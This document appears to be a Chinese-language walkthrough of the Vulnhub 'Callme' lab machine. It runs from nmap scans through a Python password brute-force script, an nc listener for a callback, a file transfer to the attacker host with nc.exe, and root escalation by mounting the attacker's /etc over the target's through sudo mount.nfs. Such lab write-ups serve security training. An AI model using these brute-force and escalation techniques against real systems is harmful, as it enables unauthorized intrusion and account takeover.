# **==Vulnhub : Callme==**

**==一.nmap四扫==**

`sudo nmap --min-rate 10000 -p- 192.168.137.137 -oA nmapscan/ports`

![image-20250318161329741](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318161329741.png)

`sudo nmap -sU --top-ports 20 192.168.137.137 -oA nmapscan/udp`

![image-20250318161413189](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318161413189.png)

`sudo nmap --script=vuln -p22,111,2323 192.168.137.137 -oA nmapscan/vuln`

![image-20250318161352379](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318161352379.png)

上面这三个都没有很有用的价值，但是有个2323和111端口，实在不行可以去看看 `searchsploit`



`sudo nmap -sT -sV -sC -O -p22,111,2323 192.168.137.137 -oA nmapscan/detail`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 04:10 EDT                       
Nmap scan report for 192.168.137.137                                                     
Host is up (0.00039s latency).                                                           
PORT     STATE SERVICE  VERSION                                                           
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                   
| ssh-hostkey:                                                                           
|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)                           
|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)                           
|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)                         
111/tcp  open  rpcbind  2-4 (RPC #100000)                                                 
| rpcinfo:                                                                               
|   program version    port/proto  service                                               
|   100000  2,3,4        111/tcp   rpcbind                                               
|_  100000  2,3,4        111/udp   rpcbind                                               
2323/tcp open  3d-nfsd?                                                                   
| fingerprint-strings:                                                                   
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, tn3270:                                           
|     Welcome to foxrecall server                                                         
|     username:                                                                           
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:               
|     Welcome to foxrecall server                                                         
|     username:                                                                           
|     Password                                                                           
|     user does not exist                                                                 
|     username:                                                                           
|   Help:                                                                                 
|     Welcome to foxrecall server                                                         
|     username:                                                                           
|     Password                                                                           
|   SIPOptions:                                            
|     Welcome to foxrecall server                          
|     username:                                            
|     Password                                             
|     user does not exist                                  
|     username:                                            
|     Password                                             
|     user does not exist                                  
|     username:                                            
|     Password                                             
|     user does not exist
|_    bye!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2323-TCP:V=7.94SVN%I=7%D=3/18%Time=67D92A77%P=x86_64-pc-linux-gnu%r
SF:(NULL,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n")%r
SF:(tn3270,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n")
SF:%r(GenericLines,54,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x
SF:20\r\nPassword\r\nuser\x20does\x20not\x20exist\r\nusername:\x20\r\n")%r
SF:(GetRequest,54,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r
SF:\nPassword\r\nuser\x20does\x20not\x20exist\r\nusername:\x20\r\n")%r(HTT
SF:POptions,54,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\nP
SF:assword\r\nuser\x20does\x20not\x20exist\r\nusername:\x20\r\n")%r(RTSPRe
SF:quest,54,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\nPass
SF:word\r\nuser\x20does\x20not\x20exist\r\nusername:\x20\r\n")%r(RPCCheck,
SF:29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n")%r(DNSVe
SF:rsionBindReqTCP,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x
SF:20\r\n")%r(DNSStatusRequestTCP,29,"Welcome\x20to\x20foxrecall\x20server
SF:\r\nusername:\x20\r\n")%r(Help,33,"Welcome\x20to\x20foxrecall\x20server
SF:\r\nusername:\x20\r\nPassword\r\n")%r(SSLSessionReq,29,"Welcome\x20to\x
SF:20foxrecall\x20server\r\nusername:\x20\r\n")%r(TerminalServerCookie,29,
SF:"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n")%r(TLSSessi
SF:onReq,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n")%r
SF:(Kerberos,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x20\r\n
SF:")%r(SMBProgNeg,29,"Welcome\x20to\x20foxrecall\x20server\r\nusername:\x
SF:20\r\n")%r(X11Probe,29,"Welcome\x20to\x20foxrecall\x20server\r\nusernam
SF:e:\x20\r\n")%r(FourOhFourRequest,54,"Welcome\x20to\x20foxrecall\x20serv
SF:er\r\nusername:\x20\r\nPassword\r\nuser\x20does\x20not\x20exist\r\nuser
SF:name:\x20\r\n")%r(LPDString,29,"Welcome\x20to\x20foxrecall\x20server\r\
SF:nusername:\x20\r\n")%r(LDAPSearchReq,29,"Welcome\x20to\x20foxrecall\x20
SF:server\r\nusername:\x20\r\n")%r(LDAPBindReq,29,"Welcome\x20to\x20foxrec
SF:all\x20server\r\nusername:\x20\r\n")%r(SIPOptions,A4,"Welcome\x20to\x20
SF:foxrecall\x20server\r\nusername:\x20\r\nPassword\r\nuser\x20does\x20not
SF:\x20exist\r\nusername:\x20\r\nPassword\r\nuser\x20does\x20not\x20exist\
SF:r\nusername:\x20\r\nPassword\r\nuser\x20does\x20not\x20exist\r\nbye!\r\
SF:n");
MAC Address: 00:0C:29:7B:AA:75 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.58 seconds
```

可以看到这里`nmap`扫出不少东西，包括2323端口的一些详细信息，`nmap`尝试访问2323端口，也有一些交互的信息，`nmap`使用 `DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, tn3270:` 但是只有 `username` 的交互，而 `FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest` 还有 `Password`的交互。

**==二.2323端口的利用==**

到这里我们用 `nc` 尝试访问

`nc 192.168.137.137 2323`

![image-20250318162659252](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318162659252.png)

可以看到这里的 `nc` 交互性不是很好，想到我们还有 `telnet` ，可以试试， `telnet` 是一个比较老的==远程登陆和端口检测==工具，其在开发时，没有考虑安全问题，现很多情况下被 `ssh` 、`nc` 代替。

试试 `telnet`

![image-20250318163127860](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318163127860.png)

`telnet 192.168.137.137 2323`

![image-20250318163201315](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318163201315.png)

这个的交互相对完整，可以注意到，我们用弱口令登陆，提示`Wrong password for user admin`，尝试别的账号登陆 

![image-20250318163412194](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318163412194.png)

首先这里提示 `user does not exist` ，那我们可以知道 `admin`用户是存在的，而且这里我们只有三次机会。

到这里我们就知道有个用户是 `admin` 别的我们也不知道，使用 `hydra` 进行爆破

**==三.hydra爆破==**

`sudo hydra -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt telnet://192.168.137.137:2323 -t 64`

`sudo hydra -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt telnet 192.168.137.137 -s 2323`

![image-20250318202348614](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318202348614.png)

`hydra` 爆破的效果不是很好，应该是交互性强了一点，hydra应对不了，导致时间很长

只能自己写个脚本，遍历字典就行，这个有个密码的字典

`/usr/share/seclists/Passwords/500-worst-passwords.txt`

```
import socket
import time
import sys
import os
try:
    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    wordlist = sys.argv[3]

    if not os.path.exists(wordlist):
        print("[-] The wordlist does not exists, exiting the program now!")
        sys.exit()
except IndexError:
    print("[-] Usage %s <target ip> <port> <wordlist>" % sys.argv[0])
    sys.exit()
except Exception as e:
    print("[-] Something is wrong: %s" % e)
    sys.exit()

with open(wordlist, 'r') as file:
    for password in file:
        username = b'admin'
        s = socket.socket()
        s.connect((target_ip, port))
        print(s.recv(1024))
        print(s.recv(1024))
        s.send(username+b'\r\n')
        print(s.recv(1024))
        s.send(password.strip().encode()+b'\r\n')
        re = s.recv(1024)
        print(re)
        print(s.recv(1024))
        print(password.strip())
        time.sleep(1.2)
        if not "Wrong password for user admin" in str(re):
            print("---------------------------------")
            print(password)
            break
```

`python3 exp.py 192.168.137.137 2323 /usr/share/seclists/Passwords/500-worst-passwords.txt`

![image-20250318201258486](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318201258486.png)

最后密码也是出来了，`admin`:`booboo`

`telnet 192.168.137.137 2323`

![image-20250318203327828](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318203327828.png)



有一串很奇怪的英文

```
TWO THOUSAND TWO HUNDRED SIXTY SEVEN 
You are not ready sorry...
```

2267，多试几次猜测是端口号，使用 `tshark` 监控流量

`tshark -i eth0` 监控 `eth0` 网卡的流量

![image-20250318203601426](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318203601426.png)

可以看到，这确实是端口号，而且是由靶机向主机发的请求，这显然是连不上的。因为我们都没有开启服务，看来得写脚本了，在那串英文发出来之后，要立马开启服务，更加极端的做法是，把所有的端口都开启。

```
import re
import socket
import subprocess

# 靶机地址和端口
TARGET_IP = "192.168.137.137"
TARGET_PORT = 2323  # 假设靶机的服务运行在22端口

# 英文数字到数字的映射
NUMBER_WORDS = {
    "zero": 0, "one": 1, "two": 2, "three": 3, "four": 4,
    "five": 5, "six": 6, "seven": 7, "eight": 8, "nine": 9,
    "ten": 10, "eleven": 11, "twelve": 12, "thirteen": 13,
    "fourteen": 14, "fifteen": 15, "sixteen": 16, "seventeen": 17,
    "eighteen": 18, "nineteen": 19, "twenty": 20, "thirty": 30,
    "forty": 40, "fifty": 50, "sixty": 60, "seventy": 70,
    "eighty": 80, "ninety": 90, "hundred": 100, "thousand": 1000
}

def words_to_number(words):
    """将英文数字转换为整数"""
    words = words.lower().replace("-", " ").split()
    number = 0
    temp = 0
    for word in words:
        if word in NUMBER_WORDS:
            if word == "hundred":
                temp *= 100
            elif word == "thousand":
                temp *= 1000
                number += temp
                temp = 0
            else:
                temp += NUMBER_WORDS[word]
    number += temp
    return number

def get_port_from_response(response):
    """从靶机响应中提取英文端口号"""
    # 假设响应中包含类似 "TWO THOUSAND TWO HUNDRED SIXTY SEVEN" 的文本
    match = re.search(r"[A-Za-z\s-]+", response)
    if match:
        return match.group(0).strip()
    return None

def start_listener(port):
    """在指定端口上启动一个简单的监听服务"""
    print(f"[+] Starting listener on port {port}...")
    try:
        # 使用 netcat 监听端口
        subprocess.run(["nc", "-lvp", str(port)])
    except KeyboardInterrupt:
        print("[!] Listener stopped.")

def main():
    # 连接到靶机
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")

        # 接收靶机响应
        print(s.recv(1024))
        print(s.recv(1024))
        s.send(b"admin"+b'\r\n')
        print(s.recv(1024))
        s.send(b"booboo"+b'\r\n')
        response = s.recv(1024).decode("utf-8")
        print(f"[*] Response from server: {response}")

        # 提取英文端口号
        port_words = get_port_from_response(response)
        if port_words:
            port = words_to_number(port_words)
            print(f"[*] Extracted port: {port}")

            # 启动监听服务
            start_listener(port)
        else:
            print("[!] Failed to extract port from response.")

if __name__ == "__main__":
    main()
```

![image-20250318205538548](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318205538548.png)



**==四.初识Wine==**

![image-20250318205656245](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318205656245.png)

可以看到这里 `Z:\home\fox` 有点奇怪，有点 `Linux` 样子，又有点 `windows`的样子，但不管怎么样是进来了

![image-20250318205932399](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318205932399.png)

可以看到这个还是倾向于`windows` 

`type local.txt`

![image-20250318210031881](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318210031881.png)

`type startup`

![image-20250318210701137](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318210701137.png)

fox目录看完了

![image-20250318210813611](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318210813611.png)

看看 ppp，也是空的



看看根目录

![image-20250318210920079](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250318210920079.png)

学完wine回来了

![image-20250322153810187](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322153810187.png)

可以看到这，这里的 `Z:\home\fox` 和linux、win都不太一样，既有linux的影子，也有`win`的影子，其实`wine`就是搭建在`linux`上的类`win` 系统，就是方便在`Linux`上使用`win`，在`wine`上有一个==默认的隐藏目录，不出现在目录里面==，`./wine` ，这个目录存放这很多配置文件和应用，前面看到 `recallserver.exe` 前面没写路径，表示着 `recallserver.exe` 存放到本目录或者存放在默认的环境目录（类似于环境变量），而`wine`，默认的应用程序调用目录在 `./wine/drive_c/windows/system32`

![image-20250322154623427](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322154623427.png)

![image-20250322154652286](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322154652286.png)

![image-20250322154703655](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322154703655.png)

看到有`recallserver.exe` 和 `nc.exe` 那就用`nc.exe` 把`recallserver.exe` 搬运到本地查看

kali: `sudo nc -lvnp 1234 > recallserver.exe`

wine: `.\nc.exe 192.168.137.129 1234 < recallserver.exe`

![image-20250322155126670](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322155126670.png)

![image-20250322155140105](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322155140105.png)

`wine`立足点用了`nc` 就卡在监听位置，只能退出，重新获得立足点。

`recallserver.exe` 已经搬运好了，首先查看文件是否完整

![image-20250322155400783](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322155400783.png)

用 `strings` 命令查看关键词 `strings recallserver.exe | grep pass -i -A 3 -B 3`

![image-20250322160032839](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322160032839.png)

获得密码：`tutankamenFERILLI` 猜测一下，我们一开始进入`wine`终端是`fox`用户，结合前面开放了ssh服务，那我们可以先试试`ssh`服务：`sudo ssh fox@192.168.137.137`

![image-20250322160549974](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322160549974.png)

ok，到了熟悉的`linux`系统了

![image-20250322170754183](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322170754183.png)

可以看到，`fox`有`mount.nfs`的`root`权限，那就有个设想，用 `fox`用户将本机的`/etc`挂载到攻击机`/etc` 目录，如果我们现在攻击机上新建一个root权限的用户，并且在`passwd`文件保存密码，如果在靶机执行`su`切换用户，那么靶机就会在攻击机的`/etc/passwd`查找用户，显然，此时我们可以登陆

![image-20250322192925087](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322192925087.png)

所有需要配置 `/etc/exports`

![image-20250322193157884](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322193157884.png)

接下来需要把我们的提权用户添加到攻击机的`/etc/passwd` 

`openssl passwd -1`

![image-20250322194524107](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322194524107.png)

![image-20250322194535726](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322194535726.png)

![image-20250322194546556](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322194546556.png)

接下来，启动我们本机的nfs.mount，让靶机来挂载我们

首先启动`nfs`的守护进程，因为靶机

![image-20250322195827259](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322195827259.png)

`sudo /etc/init.d/nfs-kernel-server restart` 

在靶机执行 `sudo mount.nfs 192.168.137.129:/etc /etc`

![image-20250322200047927](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322200047927.png)

可以看到，这里是成功挂载了，那就直接提权了

![image-20250322200239025](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322200239025.png)

成功提权

![image-20250322200420066](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250322200420066.png)